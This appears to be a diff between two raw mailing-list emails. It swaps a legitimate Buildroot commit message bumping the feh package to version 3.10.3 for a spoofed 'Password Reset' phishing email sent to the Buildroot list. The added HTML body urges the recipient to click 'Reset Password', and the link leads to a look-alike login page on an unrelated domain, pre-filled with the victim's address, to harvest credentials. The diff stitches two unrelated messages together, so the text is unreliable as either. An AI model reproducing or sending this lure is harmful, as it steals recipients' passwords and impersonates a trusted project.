@@ -4,49 +4,47 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 044F6E7717F
-	for <buildroot@archiver.kernel.org>; Thu, 12 Dec 2024 11:59:02 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 91E1AE7717F
+	for <buildroot@archiver.kernel.org>; Thu, 12 Dec 2024 14:04:59 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp4.osuosl.org (Postfix) with ESMTP id 157D141498;
-	Thu, 12 Dec 2024 11:59:02 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id 3CD14406E3;
+	Thu, 12 Dec 2024 14:04:59 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp4.osuosl.org ([127.0.0.1])
  by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id Ddy6XWRdJzN9; Thu, 12 Dec 2024 11:59:00 +0000 (UTC)
+ id q8WVk3BzCwdN; Thu, 12 Dec 2024 14:04:58 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org B5AE64148D
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 0EAA34145D
 Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
-	by smtp4.osuosl.org (Postfix) with ESMTP id B5AE64148D;
-	Thu, 12 Dec 2024 11:59:00 +0000 (UTC)
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by lists1.osuosl.org (Postfix) with ESMTP id 10854113C
- for <buildroot@buildroot.org>; Thu, 12 Dec 2024 11:58:59 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id 0EAA34145D;
+	Thu, 12 Dec 2024 14:04:58 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by lists1.osuosl.org (Postfix) with ESMTP id 4419B113C
+ for <buildroot@buildroot.org>; Thu, 12 Dec 2024 14:04:56 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id E847941489
- for <buildroot@buildroot.org>; Thu, 12 Dec 2024 11:58:58 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id 321D081BB2
+ for <buildroot@buildroot.org>; Thu, 12 Dec 2024 14:04:56 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id gC-01zCRn3Qa for <buildroot@buildroot.org>;
- Thu, 12 Dec 2024 11:58:57 +0000 (UTC)
-X-Comment: SPF check N/A for local connections - client-ip=140.211.167.122;
- helo=busybox.osuosl.org; envelope-from=buildroot-git-push@osuosl.org;
- receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org DB54E4142B
-Received: from busybox.osuosl.org (busybox.osuosl.org [140.211.167.122])
- by smtp4.osuosl.org (Postfix) with ESMTP id DB54E4142B
- for <buildroot@buildroot.org>; Thu, 12 Dec 2024 11:58:57 +0000 (UTC)
-Received: by busybox.osuosl.org (Postfix, from userid 4053)
- id C7C1086DE8; Thu, 12 Dec 2024 11:58:57 +0000 (UTC)
-From: Peter Korsgaard <peter@korsgaard.com>
-To: buildroot@buildroot.org
-Date: Thu, 12 Dec 2024 12:56:27 +0100
-X-Git-Refname: refs/heads/master
-X-Git-Oldrev: 845884d9c5709ab0b26458530c57b76e2a026963
-X-Git-Newrev: 918416bf9aa17417d965a64ddf09d0b4a8fa651b
-X-Patchwork-Hint: ignore
-Message-Id: <20241212115857.C7C1086DE8@busybox.osuosl.org>
-Subject: [Buildroot] [git commit] package/feh: bump to version 3.10.3
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id XCapgXPl2QvD for <buildroot@buildroot.org>;
+ Thu, 12 Dec 2024 14:04:55 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=51.83.140.59;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org D683D81353
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org D683D81353
+Received: from busybox.net (ns31098807.ip-51-83-140.eu [51.83.140.59])
+ by smtp1.osuosl.org (Postfix) with ESMTP id D683D81353
+ for <buildroot@busybox.net>; Thu, 12 Dec 2024 14:04:54 +0000 (UTC)
+From: buildroot@busybox.net
+To: buildroot@busybox.net
+Date: 12 Dec 2024 13:04:53 -0100
+Message-ID: <20241212130453.AB23272925C5E773@busybox.net>
+MIME-Version: 1.0
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] Password Reset CRM:0318645
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.30
 Precedence: list
@@ -58,86 +56,85 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============5546324149526142546=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-commit: https://git.buildroot.net/buildroot/commit/?id=918416bf9aa17417d965a64ddf09d0b4a8fa651b
-branch: https://git.buildroot.net/buildroot/commit/?id=refs/heads/master
+--===============5546324149526142546==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-For change log, see [1].
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><font color=3D"#222222"><font face=3D"Verdana">Dear Customer<br><br><=
+font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inhe=
+rit;">Username:<span>&nbsp;</span></font></font></font></font><a style=3D"c=
+olor: rgb(17, 85, 204);" href=3D"mailto:buildroot@busybox.net" target=3D"_b=
+lank"><font face=3D"Verdana"><font style=3D"vertical-align: inherit;"><font=
+ style=3D"vertical-align: inherit;">buildroot@busybox.net</font></font></fo=
+nt></a><font color=3D"#222222"><font face=3D"Verdana">&#8201;<br><br><br><b=
+r>
+<font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inh=
+erit;">A password reset has been requested for your account. <br><br>If you=
+ believe you have received this email in error, please contact technical su=
+pport for assistance.<br></font></font><br>
+<span style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font=
+-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; floa=
+t: none; display: inline !important; white-space: normal; orphans: 2; widow=
+s: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal;=
+ font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;"></span></font></font>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255)=
+; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
+troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
+: initial; text-decoration-color: initial;">
+<font face=3D"Verdana" size=3D"3">
+<a id=3D"m_69599521473703964701link" style=3D"color: rgb(17, 85, 204);" hre=
+f=3D"https://bumiborneoabadi.com/mail1/verify/login/new.index.html#buildroo=
+t@busybox.net" target=3D"_blank"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://speckwarrant=
+y.powerappsportals.com/fr-FR/Account/Login/ResetPassword?userId%3De59978c9-=
+3346-ee11-be6f-000d3adf750c%26code%3DQHCrNOLq2jWrXtvRrlmfxOOTYvSMiikd5QRwp1=
+JEKy52uNxuF2Oz7YoftyIDB1pTBbkNbHYd1R%252F86mw2OqDYez9RBaV0VIAp5BzDeO8r5aymm=
+ro3Yj5mI2lK9yZIISi%252BDDx894ZMgDcy5%252BPHCHxbDRg2KaIzRpyEVvmQivz%252FGWz%=
+252FRYNbHvhMmL3KRpHO6HIUnvLB%252FNnZaAq7o%252FiDv8dT3g%253D%253D&amp;source=
+=3Dgmail&amp;ust=3D1734029360232000&amp;usg=3DAOvVaw2mGdpzo3
+&#10;lLyfLv6t1MwLFK"><font style=3D"vertical-align: inherit;"><font style=
+=3D"vertical-align: inherit;">Reset Password</font></font></a></font></div>=
 
-This commit also adds the "file" package optional dependency, for
-libmagic. This support was introduced in commit [2].
+<font face=3D"Verdana" size=3D"3" style=3D"color: rgb(34, 34, 34); text-tra=
+nsform: none; text-indent: 0px; letter-spacing: normal; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; wido=
+ws: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal=
+; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoratio=
+n-thickness: initial; text-decoration-style: initial; text-decoration-color=
+: initial;"><br><font style=3D"vertical-align: inherit;">
+<font style=3D"vertical-align: inherit;">Please click the following link to=
+ cancel the password reset procedure.<br><br>Do not reply to this message. =
+This email address is not monitored and we are therefore unable to reply to=
+ messages sent to this address. &nbsp;</font></font><br><br><font style=3D"=
+vertical-align: inherit;"><font style=3D"vertical-align: inherit;">Kind reg=
+ards,</font></font><br><br><font style=3D"vertical-align: inherit;"><font s=
+tyle=3D"vertical-align: inherit;">
+The Customer Service Team</font></font></font></body></html>
 
-This commit also updates the project home page and download site URL
-to use https.
+--===============5546324149526142546==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-Finally, the LICENSE file hash is updated to reflect change in [3].
-
-[1] https://github.com/derf/feh/blob/3.10.3/ChangeLog
-[2] https://github.com/derf/feh/commit/4affafe91579799efd83f4c8e05c291eeb684c9c
-[3] https://github.com/derf/feh/commit/1197dafc110fb0a2e322b977d2dced15456bf7df
-
-Signed-off-by: Julien Olivain <ju.o@free.fr>
-Signed-off-by: Peter Korsgaard <peter@korsgaard.com>
----
- package/feh/Config.in |  2 +-
- package/feh/feh.hash  |  4 ++--
- package/feh/feh.mk    | 11 +++++++++--
- 3 files changed, 12 insertions(+), 5 deletions(-)
-
-diff --git a/package/feh/Config.in b/package/feh/Config.in
-index 7a348a1507..6f0bdd3242 100644
---- a/package/feh/Config.in
-+++ b/package/feh/Config.in
-@@ -10,4 +10,4 @@ config BR2_PACKAGE_FEH
- 	help
- 	  feh is an X11 image viewer aimed mostly at console users.
- 
--	  http://feh.finalrewind.org/
-+	  https://feh.finalrewind.org/
-diff --git a/package/feh/feh.hash b/package/feh/feh.hash
-index f74b8fa335..f86a7ef6d7 100644
---- a/package/feh/feh.hash
-+++ b/package/feh/feh.hash
-@@ -1,3 +1,3 @@
- # Locally calculated after checking pgp signature
--sha256  57ab1ca61f57c96595878069f550d36f518530f88fa31b74cc39cd739f9258b6  feh-3.7.1.tar.bz2
--sha256  2c3a31327dc3cc3331aa6e759d378e4f66d0ece7174a0d5aa137f3cba4bf0509  COPYING
-+sha256  5426e2799770217af1e01c2e8c182d9ca8687d84613321d8ab4a66fe4041e9c8  feh-3.10.3.tar.bz2
-+sha256  881f1b901b5b99bce372fd9498106724a1ea52450f7bfc6fc1cce6736a2faf4d  COPYING
-diff --git a/package/feh/feh.mk b/package/feh/feh.mk
-index df03deedde..be3b67aff9 100644
---- a/package/feh/feh.mk
-+++ b/package/feh/feh.mk
-@@ -4,14 +4,21 @@
- #
- ################################################################################
- 
--FEH_VERSION = 3.7.1
-+FEH_VERSION = 3.10.3
- FEH_SOURCE = feh-$(FEH_VERSION).tar.bz2
--FEH_SITE = http://feh.finalrewind.org
-+FEH_SITE = https://feh.finalrewind.org
- FEH_DEPENDENCIES = imlib2 libpng xlib_libXt
- FEH_LICENSE = MIT
- FEH_LICENSE_FILES = COPYING
- FEH_CPE_ID_VALID = YES
- 
-+ifeq ($(BR2_PACKAGE_FILE),y)
-+FEH_DEPENDENCIES += file
-+FEH_MAKE_OPTS += magic=1
-+else
-+FEH_MAKE_OPTS += magic=0
-+endif
-+
- ifeq ($(BR2_PACKAGE_LIBCURL),y)
- FEH_DEPENDENCIES += libcurl
- FEH_MAKE_OPTS += curl=1
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============5546324149526142546==--
